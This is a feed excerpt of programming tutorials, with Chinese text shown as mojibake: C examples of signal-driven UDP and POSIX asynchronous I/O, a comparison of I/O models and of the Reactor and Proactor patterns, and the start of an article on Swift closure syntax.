<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span>

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// 2. ç»‘å®šåœ°å€</span>
    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);
    servaddr.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-comment">// 3. æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°</span>
    signal(SIGIO, sigio_handler);

    <span class="hljs-comment">// 4. ã€å…³é”®ã€‘è®¾ç½® Socket å±ä¸»ï¼šå‘Šè¯‰å†…æ ¸ SIGIO ä¿¡å·å‘ç»™å½“å‰è¿›ç¨‹</span>
    fcntl(sockfd, F_SETOWN, getpid());

    <span class="hljs-comment">// 5. ã€å…³é”®ã€‘å¼€å¯ä¿¡å·é©±åŠ¨ I/O æ¨¡å¼</span>
    <span class="hljs-type">int</span> flags = fcntl(sockfd, F_GETFL, <span class="hljs-number">0</span>);
    fcntl(sockfd, F_SETFL, flags | O_ASYNC | O_NONBLOCK);

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¿¡å·é©±åŠ¨ I/O å·²å°±ç»ªï¼Œè¿›ç¨‹æ­£åœ¨æ‰§è¡Œå…¶ä»–ä»»åŠ¡...\n"</span>);

    <span class="hljs-comment">// æ¨¡æ‹Ÿè¿›ç¨‹åœ¨å¹²åˆ«çš„äº‹æƒ…</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"."</span>);
        fflush(<span class="hljs-built_in">stdout</span>);
        sleep(<span class="hljs-number">1</span>); 
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>å‘é€æ•°æ®</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span>
    <span class="hljs-type">char</span> *message = <span class="hljs-string">"Hello from Client! This is a Signal Trigger."</span>;

    <span class="hljs-comment">// 1. åˆ›å»º UDP Socket</span>
    <span class="hljs-keyword">if</span> ((sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"socket creation failed"</span>);
        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
    }

    <span class="hljs-built_in">memset</span>(&amp;servaddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servaddr));

    <span class="hljs-comment">// 2. å¡«å……æœåŠ¡å™¨ä¿¡æ¯ (8080 ç«¯å£)</span>
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(<span class="hljs-number">8080</span>);
    servaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"127.0.0.1"</span>);

    <span class="hljs-comment">// 3. å‘é€æ•°æ®</span>
    <span class="hljs-type">int</span> n = sendto(sockfd, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)message, <span class="hljs-built_in">strlen</span>(message),
        <span class="hljs-number">0</span>, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *) &amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));
    
    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"sendto failed"</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æˆåŠŸå‘ 8080 ç«¯å£å‘é€äº† %d å­—èŠ‚æ•°æ®ã€‚\n"</span>, n);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å†…å®¹: %s\n"</span>, message);
    }

    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-24">7. å¼‚æ­¥ I/O (Asynchronous IO)</h2>
<p>çœŸæ­£çš„å¼‚æ­¥æ¨¡å‹ï¼Œè¿›ç¨‹å‘èµ· aio_read åç›´æ¥è¿”å›ï¼Œå»å¹²åˆ«çš„äº‹ã€‚å†…æ ¸ä¼šè‡ªåŠ¨å®Œæˆâ€œç­‰å¾…æ•°æ®â€å’Œâ€œæ‹·è´æ•°æ®â€ä¸¤ä¸ªé˜¶æ®µï¼Œå®Œæˆåå†é€šçŸ¥è¿›ç¨‹ã€‚</p>
<p>AIOæ•ˆç‡æœ€é«˜ï¼Œä½† Linux ç°æœ‰çš„ AIO å®ç°å¹¶ä¸å®Œç¾ï¼ˆä¸»è¦é’ˆå¯¹æ–‡ä»¶ I/Oï¼Œç½‘ç»œ I/O ä»ä»¥ epoll ä¸ºä¸»ï¼‰ã€‚AIO æ²¡æœ‰ä¼ ç»ŸIOçš„ä¸¤ä¸ªé˜¶æ®µã€‚å®ƒæŠŠä¼ ç»Ÿ I/O æ¨¡å‹ä¸­çš„ä¸¤ä¸ªé˜¶æ®µåˆå¹¶æˆä¸€ä¸ªå®Œå…¨å¼‚æ­¥çš„é˜¶æ®µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c016ed11cd146e6bd54242cfd7777b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=QXo31xP30VNAIGt2pbNXcwMEQnI%3D" alt="" loading="lazy"/></p>
<p><strong>å¼‚æ­¥ I/Oå‚è€ƒä»£ç </strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> BUF_SIZE 1024</span>

<span class="hljs-comment">// 1. å®šä¹‰å›è°ƒå‡½æ•°</span>
<span class="hljs-comment">// å½“å¼‚æ­¥è¯»å–å®Œæˆåï¼Œå†…æ ¸ä¼šè‡ªåŠ¨åœ¨ä¸€ä¸ªæ–°çº¿ç¨‹ä¸­è°ƒç”¨æ­¤å‡½æ•°</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">my_aio_completion_handler</span><span class="hljs-params">(<span class="hljs-keyword">union</span> sigval sv)</span> {
    <span class="hljs-comment">// é€šè¿‡ sv.sival_ptr æ‰¾å›æˆ‘ä»¬æäº¤çš„ä»»åŠ¡æ§åˆ¶å— aiocb</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">aiocb</span> *<span class="hljs-title">cbp</span> =</span> (<span class="hljs-keyword">struct</span> aiocb *)sv.sival_ptr;

    <span class="hljs-comment">// æ£€æŸ¥ä»»åŠ¡æ˜¯å¦çœŸçš„æˆåŠŸå®Œæˆ</span>
    <span class="hljs-keyword">if</span> (aio_error(cbp) == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// ã€å…³é”®ã€‘è°ƒç”¨ aio_return ç»“ç®—ç»“æœï¼ˆè·å–è¯»å–çš„å­—èŠ‚æ•°ï¼‰</span>
        <span class="hljs-type">ssize_t</span> n = aio_return(cbp);
        
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n[å›è°ƒçº¿ç¨‹é€šçŸ¥] å¼‚æ­¥è¯»å–å®Œæˆï¼\n"</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å†…å®¹: %.*s\n"</span>, (<span class="hljs-type">int</span>)n, (<span class="hljs-type">char</span> *)cbp-&gt;aio_buf);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"è¯»å–å­—èŠ‚æ•°: %ld\n"</span>, n);
    } <span class="hljs-keyword">else</span> {
        perror(<span class="hljs-string">"aio_error"</span>);
    }

    <span class="hljs-comment">// ä»»åŠ¡ç»“æŸåå…³é—­æ–‡ä»¶æè¿°ç¬¦</span>
    close(cbp-&gt;aio_fildes);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å›è°ƒå¤„ç†å®Œæ¯•ï¼Œå­çº¿ç¨‹é€€å‡ºã€‚\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">"test.txt"</span>, O_RDONLY);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"è¯·å…ˆåˆ›å»ºä¸€ä¸ªåä¸º test.txt çš„æ–‡ä»¶"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 2. å‡†å¤‡ aiocb ç»“æ„ä½“</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">aiocb</span> <span class="hljs-title">cb</span>;</span>
    <span class="hljs-type">char</span> buffer[BUF_SIZE];
    <span class="hljs-built_in">memset</span>(&amp;cb, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> aiocb));

    cb.aio_fildes = fd;
    cb.aio_buf = buffer;
    cb.aio_nbytes = BUF_SIZE;
    cb.aio_offset = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// 3. è®¾ç½®å›è°ƒæœºåˆ¶ (SIGEV_THREAD)</span>
    cb.aio_sigevent.sigev_notify = SIGEV_THREAD;            <span class="hljs-comment">// é€šçŸ¥æ–¹å¼ï¼šå¯åŠ¨çº¿ç¨‹</span>
    cb.aio_sigevent.sigev_notify_function = my_aio_completion_handler; <span class="hljs-comment">// æŒ‡å®šå‡½æ•°</span>
    cb.aio_sigevent.sigev_notify_attributes = <span class="hljs-literal">NULL</span>;         <span class="hljs-comment">// ä½¿ç”¨é»˜è®¤çº¿ç¨‹å±æ€§</span>
    cb.aio_sigevent.sigev_value.sival_ptr = &amp;cb;            <span class="hljs-comment">// ä¼ é€’ç»™å›è°ƒå‡½æ•°çš„å‚æ•°</span>

    <span class="hljs-comment">// 4. å‘èµ·å¼‚æ­¥è¯»å–</span>
    <span class="hljs-keyword">if</span> (aio_read(&amp;cb) == <span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"aio_read"</span>);
        close(fd);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¸»çº¿ç¨‹ï¼šè¯»å–è¯·æ±‚å·²æäº¤ï¼Œæˆ‘ç°åœ¨è¦å»å¿™åˆ«çš„äº‹äº†...\n"</span>);

    <span class="hljs-comment">// 5. æ¨¡æ‹Ÿä¸»çº¿ç¨‹ç¹å¿™ï¼Œè¯æ˜å®ƒæ²¡æœ‰è¢«å¡ä½</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¸»çº¿ç¨‹ï¼šæ­£åœ¨å¤„ç†ä¸šåŠ¡é€»è¾‘ %d...\n"</span>, i);
        sleep(<span class="hljs-number">1</span>);
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¸»çº¿ç¨‹ï¼šæ‰€æœ‰å·¥ä½œå®Œæˆï¼Œç¨‹åºå³å°†é€€å‡ºã€‚\n"</span>);
    <span class="hljs-comment">// ç»™å›è°ƒçº¿ç¨‹ç•™ä¸€ç‚¹è¿è¡Œæ—¶é—´</span>
    sleep(<span class="hljs-number">1</span>); 

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-25">8.æ€»ç»“å¯¹æ¯”</h2>
<p>æœ€åæ€»ç»“å¯¹æ¯”ä¸€ä¸‹å„ä¸ªIOæ¨¡å‹</p>









































<table><thead><tr><th><strong>æ¨¡å‹</strong></th><th><strong>é˜¶æ®µ 1 (ç­‰å¾…å°±ç»ª)</strong></th><th><strong>é˜¶æ®µ 2 (æ•°æ®æ‹·è´)</strong></th><th><strong>æ˜¯å¦å¼‚æ­¥</strong></th></tr></thead><tbody><tr><td><strong>é˜»å¡ I/O</strong></td><td>é˜»å¡</td><td>é˜»å¡</td><td>åŒæ­¥</td></tr><tr><td><strong>éé˜»å¡ I/O</strong></td><td>è½®è¯¢</td><td>é˜»å¡</td><td>åŒæ­¥</td></tr><tr><td><strong>I/O å¤šè·¯å¤ç”¨</strong></td><td>é˜»å¡ (åœ¨ select/poll/epoll ä¸Š)</td><td>é˜»å¡</td><td>åŒæ­¥</td></tr><tr><td><strong>ä¿¡å·é©±åŠ¨ I/O</strong></td><td>å¼‚æ­¥ (ä¿¡å·é€šçŸ¥)</td><td>é˜»å¡</td><td>åŒæ­¥</td></tr><tr><td><strong>å¼‚æ­¥ I/O (AIO)</strong></td><td>å¼‚æ­¥</td><td>å¼‚æ­¥</td><td>çœŸæ­£å¼‚æ­¥</td></tr></tbody></table>
<h2 data-id="heading-26">9.ç½‘ç»œæ¡†æ¶è®¾è®¡æ¨¡å¼</h2>
<p>æˆ‘ä»¬å¸¸è§çš„<strong>Reactor</strong>æ¨¡å¼å’Œ<strong>Proactor</strong>æ¨¡å¼æ˜¯ä¸¤ç§å¸¸è§çš„ç½‘ç»œæ¡†æ¶è®¾è®¡æ¨¡å¼</p>
<h3 data-id="heading-27">Reactoræ¨¡å¼</h3>
<p>Reactor æ˜¯ã€Œè¢«åŠ¨å¼ I/Oã€ï¼Œåº”ç”¨æ˜¯è¢«â€œäº‹ä»¶â€æ¨åŠ¨çš„ã€‚è¢«åŠ¨çš„ç­‰å¾…å†…æ ¸é€šçŸ¥å¯è¯»/å¯å†™ï¼Œå†è¿›è¡Œå¯¹åº”çš„è¯»å†™æ“ä½œã€‚ç”±å†…æ ¸é€šçŸ¥åº”ç”¨ç¨‹åºå¯ä»¥å¹²æ´»äº†ï¼ˆåº”ç”¨ç¨‹åºè¿˜å¾—è‡ªå·±åŠ¨æ‰‹ï¼‰</p>
<h3 data-id="heading-28">Proactoræ¨¡å¼</h3>
<p>Proactor æ˜¯ã€Œä¸»åŠ¨å¼ I/Oã€ï¼Œ åº”ç”¨ä¸»åŠ¨å‘èµ· I/O è¡Œä¸ºï¼ŒI/O åœ¨åå°å®Œæˆã€‚å†…æ ¸é€šçŸ¥ä½ æ´»å·²ç»å¹²å®Œäº†ï¼ˆåº”ç”¨ç¨‹åºç›´æ¥æ‹¿ç»“æœï¼‰ã€‚</p>
<h3 data-id="heading-29">ä¸¤ç§æ¨¡å¼å¯¹æ¯”</h3>



































<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>Reactor (åŒæ­¥)</strong></th><th><strong>Proactor (å¼‚æ­¥)</strong></th></tr></thead><tbody><tr><td><strong>è°åš read/write</strong></td><td>åº”ç”¨ç¨‹åº</td><td>æ“ä½œç³»ç»Ÿ</td></tr><tr><td><strong>é€šçŸ¥æ—¶æœº</strong></td><td><strong>æ•°æ®å·²å°±ç»ª</strong> (å¯ä»¥è¯»äº†)</td><td><strong>æ“ä½œå·²å®Œæˆ</strong> (å·²ç»è¯»å®Œäº†)</td></tr><tr><td><strong>æ•°æ®æ¬è¿</strong></td><td>é˜»å¡æ‹·è´ (Kernel -&gt; Application)</td><td>å¼‚æ­¥æ‹·è´ (æ— éœ€ç­‰å¾…)</td></tr><tr><td><strong>ç³»ç»Ÿæ”¯æŒ</strong></td><td>Linux (select,poll,epoll), Java (NIO)</td><td>Windows (IOCP), Linux (AIOï¼Œio_uring)</td></tr><tr><td><strong>ç¼–ç¨‹å¤æ‚åº¦</strong></td><td>ä¸­</td><td>é«˜</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èŠèŠswifté—­åŒ…]]></title>    <link>https://juejin.cn/post/7600469605476941866</link>    <guid>https://juejin.cn/post/7600469605476941866</guid>    <pubDate>2026-01-29T09:00:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600469605476941866" data-draft-id="7600562816458358826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠèŠswifté—­åŒ…"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T09:00:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dongczlu"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036430125"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠèŠswifté—­åŒ…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036430125/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dongczlu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T09:00:30.000Z" title="Thu Jan 29 2026 09:00:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Swifté—­åŒ…è¯­æ³•è¯¦è§£</h2>
<h3 data-id="heading-1">ä»£ç ç¤ºä¾‹</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">var</span> b:() -&gt; <span class="hljs-type">Void</span> <span class="hljs-operator">=</span> {() -&gt; <span class="hljs-type">Void</span> <span class="hljs-keyword">in</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒ¿åå‡½æ•°"</span>)
}
b()
</code></pre>
<h3 data-id="heading-2">è¯¦ç»†è§£é‡Š</h3>
<p>è¿™æ˜¯ä¸€ä¸ªSwiftä¸­çš„é—­åŒ…ï¼ˆClosureï¼‰è¯­æ³•ï¼Œå…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š</p>
<h4 data-id="heading-3">ä»£ç åˆ†è§£</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">var</span> b:() -&gt; <span class="hljs-type">Void</span> <span class="hljs-operator">=</span> {() -&gt; <span class="hljs-type">Void</span> <span class="hljs-keyword">in</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒ¿åå‡½æ•°"</span>)
}
b()
</code></pre>
<h4 data-id="heading-4">è¯­æ³•åˆ†æ</h4>
<ol>
<li>
<p><strong>å˜é‡å£°æ˜</strong>ï¼š</p>
<ul>
<li><code>var b</code>ï¼šå£°æ˜ä¸€ä¸ªå˜é‡ <code>b</code></li>
<li><code>:() -&gt; Void</code>ï¼šæŒ‡å®šå˜é‡çš„ç±»å‹æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹ï¼Œ<code>() -&gt; Void</code> è¡¨ç¤ºï¼š
<ul>
<li><code>()</code>ï¼šä¸æ¥å—ä»»ä½•å‚æ•°</li>
<li><code>-&gt; Void</code>ï¼šè¿”å› <code>Void</code> ç±»å‹ï¼ˆå³ä¸è¿”å›å€¼ï¼Œç›¸å½“äºç©ºç±»å‹ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>é—­åŒ…èµ‹å€¼</strong>ï¼š</p>
<ul>
<li><code>= {() -&gt; Void in</code>ï¼šèµ‹å€¼ç»™ä¸€ä¸ªé—­åŒ…è¡¨è¾¾å¼
<ul>
<li><code>{}</code>ï¼šé—­åŒ…çš„å¼€å§‹å’Œç»“æŸ</li>
<li><code>() -&gt; Void</code>ï¼šé—­åŒ…çš„ç±»å‹ç­¾åï¼ˆä¸å˜é‡ç±»å‹åŒ¹é…ï¼‰</li>
<li><code>in</code>ï¼šå…³é”®å­—ï¼Œè¡¨ç¤ºå‚æ•°åˆ—è¡¨å’Œå‡½æ•°ä½“çš„åˆ†éš”ç¬¦</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>é—­åŒ…ä½“</strong>ï¼š</p>
<ul>
<li><code>print("åŒ¿åå‡½æ•°")</code>ï¼šé—­åŒ…æ‰§è¡Œçš„ä»£ç </li>
</ul>
</li>
<li>
<p><strong>è°ƒç”¨</strong>ï¼š</p>
<ul>
<li><code>b()</code>ï¼šè°ƒç”¨è¿™ä¸ªé—­åŒ…å‡½æ•°</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">ç­‰ä»·å†™æ³•</h3>
<p>è¿™ä¸ªé—­åŒ…è¿˜å¯ä»¥å†™æˆæ›´ç®€æ´çš„å½¢å¼ï¼š</p>
<h4 data-id="heading-6">å®Œæ•´å†™æ³•ï¼ˆä¸Šé¢ä½¿ç”¨çš„ï¼‰</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">var</span> b: () -&gt; <span class="hljs-type">Void</span> <span class="hljs-operator">=</span> { () -&gt; <span class="hljs-type">Void</span> <span class="hljs-keyword">in</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒ¿åå‡½æ•°"</span>)
}
</code></pre>
<h4 data-id="heading-7">ç®€åŒ–å†™æ³•ï¼ˆçœç•¥ç±»å‹ï¼Œå› ä¸ºå¯ä»¥ä»ä¸Šä¸‹æ–‡æ¨æ–­ï¼‰</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">var</span> b: () -&gt; <span class="hljs-type">Void</span> <span class="hljs-operator">=</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒ¿åå‡½æ•°"</span>)
}
</code></pre>
<h4 data-id="heading-8">å°¾éšé—­åŒ…å†™æ³•ï¼ˆå¦‚æœä½œä¸ºå‚æ•°ä¼ é€’ï¼‰</h4>
